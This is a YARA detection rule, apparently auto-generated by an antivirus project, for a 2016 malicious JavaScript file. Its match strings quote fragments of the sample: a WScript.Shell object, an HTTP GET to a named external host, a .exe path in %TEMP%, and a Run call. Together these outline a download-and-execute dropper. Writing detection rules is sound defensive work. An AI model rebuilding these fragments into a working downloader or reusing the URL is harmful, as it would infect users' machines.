rule sig_20160330_2d2eee3b6f00ed9d0362682cec10e373 {
  meta:
    description = "datamaliciousorder - file 20160330_2d2eee3b6f00ed9d0362682cec10e373.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7d9d3440c9b580b77c3d7d8ab3054a3b72e8b2b9de11fc64d72a40053f493133"

  strings:
    $s1  = "var L = function O() {return WScript[G0](\"WScript\"+\".Shell\");}(), JD = 11;" fullword ascii
    $s2  = "function Q(NJ, LZ){SW = SW * 1; return NJ - LZ;};" fullword ascii
    $s3  = "V2[M](\"GET\", \"http://epegasus.pl/m2osa\", false);" fullword ascii
    $s4  = "if (V2[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OY() {return L[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"bN3XKzxcU.ex\" + \"e\";};" fullword ascii
    $s6  = "function F(){return OL + \"\";};" fullword ascii
    $s7  = "function V() {return ((NI == true) && (NI == P)) ? 1 : SW;};" fullword ascii
    $s8  = "function SP(Y){L[\"Run\"](Y, SW, SW);};" fullword ascii
    $s9  = "function B(){return 22;};" fullword ascii
    $s10 = "var U = new this[\"Date\"]();" fullword ascii
    $s11 = "function W(C) {var CF = (1, 2, 3, 4, 5, C); return CF;};" fullword ascii
    $s12 = "function HW(){return G0;};" fullword ascii
    $s13 = "return Q(V1, K0);" fullword ascii
    $s14 = "}while (H0);" fullword ascii
    $s15 = "P = true; " fullword ascii
    $s16 = "var P = false;" fullword ascii
    $s17 = "var NI = false;" fullword ascii
    $s18 = "var EA = false;" fullword ascii
    $s19 = "NI = true; " fullword ascii
    $s20 = "} catch(M0){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}